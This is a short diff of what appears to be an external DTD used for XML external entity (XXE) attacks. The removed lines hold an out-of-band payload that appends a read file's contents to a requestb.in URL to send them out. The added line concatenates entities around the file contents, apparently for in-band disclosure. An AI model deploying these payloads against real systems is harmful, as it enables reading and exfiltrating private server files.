@@ -1,3 +1,2 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://requestb.in/1ayyz3l1?%file;'>">
-%all;
+<?xml version="1.0" encoding="UTF-8" ?>
+<!ENTITY all "%start;%file;%end;">
